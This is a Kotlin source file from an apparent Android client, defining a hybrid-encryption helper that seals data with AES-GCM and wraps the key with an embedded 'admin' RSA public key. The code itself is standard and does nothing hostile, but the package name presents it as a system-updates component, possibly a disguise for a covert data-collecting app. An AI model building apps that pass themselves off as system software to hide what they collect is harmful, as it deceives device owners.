// client/android/app/src/main/java/com/system/updates/core/CryptoManager.kt
package com.system.updates.core

import android.util.Base64
import java.security.KeyFactory
import java.security.PublicKey
import java.security.spec.X509EncodedKeySpec
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey

object CryptoManager {

    private const val RSA_ALGORITHM = "RSA/ECB/OAEPWithSHA-256AndMGF1Padding"
    private const val AES_ALGORITHM = "AES/GCM/NoPadding"
    private const val ADMIN_PUBLIC_KEY_STR = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8bkzIsPaxeFjzp879/VqSpGFaer88vg3RHkd6ReGFMmOYLL3S7hMRuR7GOE5oRqutIwXsavEXaxR0rW/2aB/x6mCKGtGGfGT6dFqtTmmAPrI7EKxCiwrkbhA4cJfar4suwq0g9/Y+Cuzpw0WiRT8dU31mWlke0FJacY0xbbLivCTWbwhwIBSia31vvi/GbNZp+xno7vLui6FZNOQgsCrrft9OkRAmLwRaW1lvrkDn55m0O7ME9J7AM2vs6l4cX+u8F5NasQ0lGGVf/DY1EzV56LkNym8An4YNUXqNbeQmjPR6zIAgXex7OHnfHBMVWPRJYJE+lDXFK06I58cSD0uiwIDAQAB"

    fun encryptHybrid(data: ByteArray): Pair<String, String> {
        val keyGenerator = KeyGenerator.getInstance("AES").apply { init(256) }
        val aesKey: SecretKey = keyGenerator.generateKey()

        val aesCipher = Cipher.getInstance(AES_ALGORITHM)
        aesCipher.init(Cipher.ENCRYPT_MODE, aesKey)
        val iv = aesCipher.iv
        val encryptedData = aesCipher.doFinal(data)

        val combinedPayload = iv + encryptedData
        val encryptedDataB64 = Base64.encodeToString(combinedPayload, Base64.NO_WRAP)

        val rsaCipher = Cipher.getInstance(RSA_ALGORITHM)
        rsaCipher.init(Cipher.ENCRYPT_MODE, getPublicKey())
        val encryptedAesKey = rsaCipher.doFinal(aesKey.encoded)
        val encryptedAesKeyB64 = Base64.encodeToString(encryptedAesKey, Base64.NO_WRAP)

        return Pair(encryptedAesKeyB64, encryptedDataB64)
    }

    private fun getPublicKey(): PublicKey {
        val keyBytes = Base64.decode(ADMIN_PUBLIC_KEY_STR, Base64.DEFAULT)
        val spec = X509EncodedKeySpec(keyBytes)
        val keyFactory = KeyFactory.getInstance("RSA")
        return keyFactory.generatePublic(spec)
    }
}
